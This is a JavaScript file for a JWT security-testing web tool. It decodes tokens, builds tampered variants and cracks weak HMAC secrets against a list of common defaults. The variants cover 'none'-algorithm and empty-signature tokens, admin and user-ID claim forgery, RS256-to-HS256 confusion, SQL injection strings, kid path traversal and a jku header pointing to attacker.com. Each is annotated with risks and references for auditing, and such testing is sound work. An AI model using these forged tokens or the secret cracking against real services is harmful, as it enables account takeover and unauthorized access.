// JWT.ninja client-side logic
// Note: Attacks are annotated with risks and references for quick audit/context.

// Default and sample JWT secrets seen in tutorials, templates, and misconfigured deployments
const DEFAULT_JWT_SECRETS = [
    'secret', 'your-256-bit-secret', 'your256bitsecret', 'default', 'default-secret',
    'changeme', 'password', '123456', '12345678', '123456789', 'admin', 'root', 'toor',
    'test', 'testing', 'dev', 'development', 'staging', 'production', 'local',
    'jwtsecret', 'jwt-secret', 'jwt_secret', 'jwtsecretkey', 'jwt-secret-key', 'jwt_secret_key',
    'jwtkey', 'jwt-key', 'jwt_token_secret',
    'secretkey', 'secret-key', 'secret_key', 'supersecret', 'super-secret', 'super_secret',
    'mysecret', 'my-secret', 'my_secret', 'mysecretkey', 'my-secret-key', 'my_secret_key',
    'auth', 'token', 'shhh', 'topsecret', 'verysecretkey', 'my-very-secret', 'my-very-secret-key'
];

// Base64URL decode
function base64UrlDecode(str) {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) {
        str += '=';
    }
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

// Base64URL encode
function base64UrlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
}

// Detect base64-wrapped JWT input and decode it
function padBase64(str) {
    while (str.length % 4) {
        str += '=';
    }
    return str;
}

function autoDecodeJWTInput(input) {
    const trimmed = input.trim();
    if (!trimmed) {
        return { token: '', decodedFromBase64: false };
    }

    if (trimmed.includes('.')) {
        return { token: trimmed, decodedFromBase64: false };
    }

    const sanitized = trimmed.replace(/-/g, '+').replace(/_/g, '/');
    try {
        const decoded = atob(padBase64(sanitized)).trim();
        if (decoded.includes('.')) {
            return { token: decoded, decodedFromBase64: true };
        }
    } catch (e) {
        // Not base64 or decode failed; use original input
    }

    return { token: trimmed, decodedFromBase64: false };
}

function getCandidateSecrets(customSecret) {
    const candidates = [];
    if (customSecret && customSecret.trim()) {
        candidates.push(customSecret.trim());
    }
    DEFAULT_JWT_SECRETS.forEach(secret => {
        if (!candidates.includes(secret)) {
            candidates.push(secret);
        }
    });
    return candidates;
}

// Parse JWT
function parseJWT(token) {
    try {
        const parts = token.trim().split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format');
        }

        const header = JSON.parse(base64UrlDecode(parts[0]));
        const payload = JSON.parse(base64UrlDecode(parts[1]));
        const signature = parts[2];

        return { header, payload, signature, parts };
    } catch (e) {
        throw new Error('Failed to parse JWT: ' + e.message);
    }
}

// Create tampered JWTs with risk notes and references for each technique
function createTamperedJWTs(originalToken) {
    const { header, payload, parts } = parseJWT(originalToken);
    const tamperedTokens = [];

    // None algorithm attack: skips signature verification entirely.
    // Risk: Tokens become unsigned; any payload is accepted.
    // References: Auth0 (2015) "Critical vulnerabilities in JSON Web Token libraries"; RFC 7518 Section 6 ("none" algorithm).
    const noneHeader = { ...header, alg: 'none' };
    const noneToken = base64UrlEncode(JSON.stringify(noneHeader)) + '.' + parts[1] + '.';
    tamperedTokens.push({
        name: 'None Algorithm Attack',
        description: 'Changed algorithm to "none" and removed signature.',
        risk: 'Signature is bypassed; any attacker-chosen claims may be accepted.',
        references: [
            'Auth0: Critical vulnerabilities in JSON Web Token libraries (2015)',
            'RFC 7518 Section 6: "none" algorithm must be disabled'
        ],
        token: noneToken,
        type: 'danger',
        tag: 'CRITICAL'
    });

    // None algorithm (uppercase variation) to probe case-insensitive parsers.
    // Risk: Same as above; relies on loose algorithm comparisons.
    // References: Auth0 (2015) None-alg writeup; RFC 7518 Section 6.
    const noneUpperHeader = { ...header, alg: 'None' };
    const noneUpperToken = base64UrlEncode(JSON.stringify(noneUpperHeader)) + '.' + parts[1] + '.';
    tamperedTokens.push({
        name: 'None Algorithm (Case Variation)',
        description: 'Changed algorithm to "None" (capitalized).',
        risk: 'Signature bypass if algorithm comparison is case-insensitive.',
        references: [
            'Auth0: Critical vulnerabilities in JSON Web Token libraries (2015)',
            'RFC 7518 Section 6: "none" algorithm must be disabled'
        ],
        token: noneUpperToken,
        type: 'danger',
        tag: 'CRITICAL'
    });

    // Empty signature while leaving declared algorithm unchanged.
    // Risk: Accepting unsigned tokens where a signature is required.
    // References: RFC 7519 Section 7.2 (MUST reject invalid signatures); OWASP JWT Cheat Sheet (Always verify signatures).
    const emptySignature = parts[0] + '.' + parts[1] + '.';
    tamperedTokens.push({
        name: 'Empty Signature',
        description: 'Removed signature while keeping original algorithm.',
        risk: 'If verification is skipped, unsigned tokens may be accepted.',
        references: [
            'RFC 7519 Section 7.2: Signature must be validated',
            'OWASP JWT Cheat Sheet: Always verify signatures'
        ],
        token: emptySignature,
        type: 'danger',
        tag: 'HIGH'
    });

    // Claim tampering without resigning (privilege escalation).
    // Risk: If signature is not validated, attacker can elevate roles/claims.
    // References: OWASP JWT Cheat Sheet (do not trust claims without verification); CWE-345/347 (improper authentication/signature verification).
    const adminPayload = { ...payload };
    adminPayload.admin = true;
    if (adminPayload.role) {
        adminPayload.role = 'admin';
    }
    const adminToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(adminPayload)) + '.' + parts[2];
    tamperedTokens.push({
        name: 'Privilege Escalation (Unsigned)',
        description: 'Modified payload to add admin privileges without re-signing.',
        risk: 'If integrity checks are missing, attacker can grant themselves admin.',
        references: [
            'OWASP JWT Cheat Sheet: Always verify claims and signatures',
            'CWE-347: Improper Verification of Cryptographic Signature'
        ],
        token: adminToken,
        type: 'warning',
        tag: 'HIGH'
    });

    // RS256 → HS256 algorithm confusion.
    // Risk: Using the RSA public key as an HMAC secret lets attackers forge tokens.
    // References: CVE-2016-10555 (node-jsonwebtoken alg confusion); Auth0 blog "RSA or HMAC? A deadly mix" (2016).
    if (header.alg && header.alg.startsWith('RS')) {
        const hsHeader = { ...header, alg: 'HS256' };
        const hsToken = base64UrlEncode(JSON.stringify(hsHeader)) + '.' + parts[1] + '.' + parts[2];
        tamperedTokens.push({
            name: 'Algorithm Confusion (RS256→HS256)',
            description: 'Changed algorithm from RSA to HMAC. If the server uses the public key as HMAC secret, this may work.',
            risk: 'Misusing public keys as HMAC secrets enables forged tokens.',
            references: [
                'CVE-2016-10555: RS/HS confusion in node-jsonwebtoken',
                'Auth0: "RSA or HMAC? A deadly mix" (2016)'
            ],
            token: hsToken,
            type: 'danger',
            tag: 'CRITICAL'
        });
    }

    // User identifier modification without resigning.
    // Risk: Account takeover or horizontal escalation if claims are trusted blindly.
    // References: OWASP ASVS 2.5 (verify integrity of session tokens); OWASP JWT Cheat Sheet (validate claims).
    if (payload.sub || payload.user_id || payload.userId || payload.id) {
        const modifiedPayload = { ...payload };
        if (payload.sub) modifiedPayload.sub = '0';
        if (payload.user_id) modifiedPayload.user_id = '0';
        if (payload.userId) modifiedPayload.userId = '0';
        if (payload.id) modifiedPayload.id = '0';
        
        const modifiedToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(modifiedPayload)) + '.' + parts[2];
        tamperedTokens.push({
            name: 'User ID Modification (Unsigned)',
            description: 'Changed user identifier to "0" without re-signing.',
            risk: 'If integrity checks fail, attacker may impersonate other users.',
            references: [
                'OWASP ASVS 2.5: Protect integrity of session tokens',
                'OWASP JWT Cheat Sheet: Validate claims and signatures'
            ],
            token: modifiedToken,
            type: 'warning',
            tag: 'MEDIUM'
        });
    }

    // Null signature substitution.
    // Risk: Accepting literal "null" as a valid signature value.
    // References: CWE-347 (improper signature verification); OWASP JWT Cheat Sheet (reject null/empty signatures).
    const nullSigToken = parts[0] + '.' + parts[1] + '.null';
    tamperedTokens.push({
        name: 'Null Signature',
        description: 'Replaced signature with literal "null".',
        risk: 'Loose signature checks may treat "null" as acceptable.',
        references: [
            'CWE-347: Improper Verification of Cryptographic Signature',
            'OWASP JWT Cheat Sheet: Reject null or empty signatures'
        ],
        token: nullSigToken,
        type: 'warning',
        tag: 'MEDIUM'
    });

    // SQL injection payload in claims.
    // Risk: If claims flow into SQL without sanitization, injection is possible.
    // References: OWASP Top 10 2021 A03: Injection; CWE-89 SQL Injection.
    const sqlPayload = { ...payload };
    if (payload.sub) {
        sqlPayload.sub = "' OR '1'='1";
    } else {
        sqlPayload.username = "admin' --";
    }
    const sqlToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(sqlPayload)) + '.' + parts[2];
    tamperedTokens.push({
        name: 'SQL Injection Payload',
        description: 'Injected SQL payload into user fields.',
        risk: 'Claims used in SQL without parameterization can lead to injection.',
        references: [
            'OWASP Top 10 2021 A03: Injection',
            'CWE-89: Improper Neutralization of Special Elements in SQL'
        ],
        token: sqlToken,
        type: 'warning',
        tag: 'MEDIUM'
    });

    // kid header path traversal injection.
    // Risk: Loading keys from attacker-controlled paths (LFI/Traversal).
    // References: CVE-2018-0114 (JJWT kid path traversal); Auth0 JWT security guidance on kid validation.
    const kidHeader = { ...header, kid: '../../dev/null' };
    const kidToken = base64UrlEncode(JSON.stringify(kidHeader)) + '.' + parts[1] + '.' + parts[2];
    tamperedTokens.push({
        name: 'Kid Header Injection',
        description: 'Added/modified "kid" (Key ID) header with path traversal.',
        risk: 'Improper key loading may resolve attacker-controlled files/paths.',
        references: [
            'CVE-2018-0114: Path traversal in JJWT via kid header',
            'Auth0 JWT security recommendations: validate kid values'
        ],
        token: kidToken,
        type: 'warning',
        tag: 'HIGH'
    });

    // jku header injection (malicious JWKS URL).
    // Risk: Accepting attacker JWKS allows signing arbitrary tokens.
    // References: PortSwigger JWT attacks (JKU abuse); RFC 7517 JWK Set URL guidance (validate and pin issuer).
    const jkuHeader = { ...header, jku: 'https://attacker.com/jwks.json' };
    const jkuToken = base64UrlEncode(JSON.stringify(jkuHeader)) + '.' + parts[1] + '.' + parts[2];
    tamperedTokens.push({
        name: 'JKU Header Injection',
        description: 'Added "jku" (JWK Set URL) header pointing to attacker-controlled server.',
        risk: 'If the server fetches untrusted JWKS, attackers can supply signing keys.',
        references: [
            'PortSwigger: JWT attacks (JKU header abuse)',
            'RFC 7517: JWK Set URL must be trusted/pinned'
        ],
        token: jkuToken,
        type: 'danger',
        tag: 'CRITICAL'
    });

    return tamperedTokens;
}

// HMAC signing function
async function hmacSign(message, secret) {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
        'raw',
        encoder.encode(secret),
        { name: 'HMAC', hash: 'SHA-256' },
        false,
        ['sign']
    );
    const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(message));
    const signatureArray = Array.from(new Uint8Array(signature));
    return base64UrlEncode(signatureArray.reduce((str, byte) => str + String.fromCharCode(byte), ''));
}

// Brute force HMAC secret
async function bruteForceHMAC(token, candidateSecrets) {
    const parts = token.trim().split('.');
    if (parts.length !== 3) return null;

    const message = parts[0] + '.' + parts[1];
    const originalSignature = parts[2];

    const results = [];
    
    for (const secretCandidate of candidateSecrets) {
        try {
            const signature = await hmacSign(message, secretCandidate);
            if (signature === originalSignature) {
                results.push({
                    found: true,
                    secret: secretCandidate,
                    description: secretCandidate === '' ? '(empty string)' : secretCandidate
                });
                // Found it! But continue to check if there are collisions
            }
        } catch (e) {
            // Continue to next password
        }
    }

    return results.length > 0 ? results : null;
}

// Copy to clipboard
function copyToClipboard(text, buttonElement) {
    navigator.clipboard.writeText(text).then(() => {
        const originalText = buttonElement.textContent;
        buttonElement.textContent = '✓ Copied!';
        setTimeout(() => {
            buttonElement.textContent = originalText;
        }, 2000);
    }).catch((err) => {
        const originalText = buttonElement.textContent;
        buttonElement.textContent = '❌ Copy failed';
        console.error('Failed to copy:', err);
        setTimeout(() => {
            buttonElement.textContent = originalText;
        }, 2000);
    });
}

// Main analysis function
async function analyzeJWT() {
    const rawInput = document.getElementById('jwtInput').value;
    const { token: jwtInput, decodedFromBase64 } = autoDecodeJWTInput(rawInput);
    const customSecret = document.getElementById('customSecretInput').value;
    const candidateSecrets = getCandidateSecrets(customSecret);
    
    if (!jwtInput) {
        alert('Please enter a JWT token');
        return;
    }

    if (decodedFromBase64) {
        document.getElementById('jwtInput').value = jwtInput;
    }

    try {
        // Parse and display decoded JWT
        const { header, payload, signature } = parseJWT(jwtInput);
        
        document.getElementById('headerDisplay').textContent = JSON.stringify(header, null, 2);
        document.getElementById('payloadDisplay').textContent = JSON.stringify(payload, null, 2);
        document.getElementById('signatureDisplay').textContent = signature;
        document.getElementById('decodedSection').style.display = 'block';
        document.getElementById('base64Info').style.display = decodedFromBase64 ? 'block' : 'none';

        // Generate tampered tokens
        const tamperedTokens = createTamperedJWTs(jwtInput);
        const resultsContainer = document.getElementById('resultsContainer');
        resultsContainer.innerHTML = '';

        tamperedTokens.forEach((item) => {
            const resultDiv = document.createElement('div');
            resultDiv.className = `result-item ${item.type}`;
            
            // Create heading with name and tag
            const heading = document.createElement('h3');
            heading.textContent = item.name;
            const tagSpan = document.createElement('span');
            tagSpan.className = 'tag';
            tagSpan.textContent = item.tag;
            heading.appendChild(document.createTextNode(' '));
            heading.appendChild(tagSpan);
            
            // Create description paragraph
            const description = document.createElement('p');
            description.textContent = item.description;

            // Risk summary
            const riskP = document.createElement('p');
            const riskStrong = document.createElement('strong');
            riskStrong.textContent = 'Risk: ';
            riskP.appendChild(riskStrong);
            riskP.appendChild(document.createTextNode(item.risk));

            // References
            const refsP = document.createElement('p');
            const refsStrong = document.createElement('strong');
            refsStrong.textContent = 'References: ';
            refsP.appendChild(refsStrong);
            refsP.appendChild(document.createTextNode(item.references.join(' | ')));
            
            // Create JWT display div
            const jwtDisplay = document.createElement('div');
            jwtDisplay.className = 'jwt-display';
            jwtDisplay.textContent = item.token;
            
            // Create copy button
            const copyButton = document.createElement('button');
            copyButton.className = 'copy-btn';
            copyButton.textContent = '📋 Copy Token';
            copyButton.onclick = function() { copyToClipboard(item.token, this); };
            
            // Append all elements
            resultDiv.appendChild(heading);
            resultDiv.appendChild(description);
            resultDiv.appendChild(riskP);
            resultDiv.appendChild(refsP);
            resultDiv.appendChild(jwtDisplay);
            resultDiv.appendChild(copyButton);
            resultsContainer.appendChild(resultDiv);
        });

        document.getElementById('resultsSection').style.display = 'block';

        // Brute force HMAC if it's an HMAC algorithm
        if (header.alg && (header.alg === 'HS256' || header.alg === 'HS384' || header.alg === 'HS512')) {
            document.getElementById('bruteforceSection').style.display = 'block';
            const bruteforceContainer = document.getElementById('bruteforceContainer');
            const hasCustomSecret = customSecret && customSecret.trim();
            
            // Create loading message
            const loadingDiv = document.createElement('div');
            loadingDiv.className = 'result-item';
            const loadingP = document.createElement('p');
            loadingP.textContent = '🔄 Attempting to brute force HMAC secret using known default JWT secrets... ';
            const spinner = document.createElement('span');
            spinner.className = 'spinner';
            loadingP.appendChild(spinner);
            loadingDiv.appendChild(loadingP);
            bruteforceContainer.innerHTML = '';
            bruteforceContainer.appendChild(loadingDiv);

            setTimeout(async () => {
                const results = await bruteForceHMAC(jwtInput, candidateSecrets);
                bruteforceContainer.innerHTML = '';
                
                if (results && results.length > 0) {
                    results.forEach(result => {
                        const secretDisplay = result.secret === '' ? '(empty string)' : result.secret;
                        const resultDiv = document.createElement('div');
                        resultDiv.className = 'result-item danger';
                        
                        // Create heading
                        const heading = document.createElement('h3');
                        heading.textContent = '✅ Secret Found! ';
                        const tagSpan = document.createElement('span');
                        tagSpan.className = 'tag';
                        tagSpan.textContent = 'CRITICAL';
                        heading.appendChild(tagSpan);
                        
                        // Create first paragraph with secret
                        const p1 = document.createElement('p');
                        const strong = document.createElement('strong');
                        strong.textContent = 'The HMAC secret is: ';
                        p1.appendChild(strong);
                        const code = document.createElement('code');
                        code.style.cssText = 'background: #fff3cd; padding: 5px 10px; border-radius: 3px; font-size: 16px;';
                        code.textContent = secretDisplay;
                        p1.appendChild(code);
                        
                        // Create second paragraph
                        const p2 = document.createElement('p');
                        p2.textContent = 'This is a critical vulnerability! The JWT is signed with a weak, common password. An attacker can create valid tokens.';
                        
                        resultDiv.appendChild(heading);
                        resultDiv.appendChild(p1);
                        resultDiv.appendChild(p2);
                        bruteforceContainer.appendChild(resultDiv);
                    });
                } else {
                    const resultDiv = document.createElement('div');
                    resultDiv.className = 'result-item';
                    
                    const heading = document.createElement('h3');
                    heading.textContent = '❌ Secret Not Found';
                    
                    const p1 = document.createElement('p');
                    p1.textContent = 'Could not crack the HMAC secret with the default/common JWT secrets list. This is good! The secret appears to be strong.';
                    
                    const p2 = document.createElement('p');
                    const testedCustom = hasCustomSecret ? ' (including your custom secret)' : '';
                    p2.textContent = `Tested ${candidateSecrets.length} default JWT secrets${testedCustom}.`;
                    
                    resultDiv.appendChild(heading);
                    resultDiv.appendChild(p1);
                    resultDiv.appendChild(p2);
                    bruteforceContainer.appendChild(resultDiv);
                }
            }, 100);
        } else {
            document.getElementById('bruteforceSection').style.display = 'none';
        }

    } catch (e) {
        alert('Error: ' + e.message);
    }
}

// Allow Enter key to trigger analysis
document.getElementById('jwtInput').addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key === 'Enter') {
        analyzeJWT();
    }
});
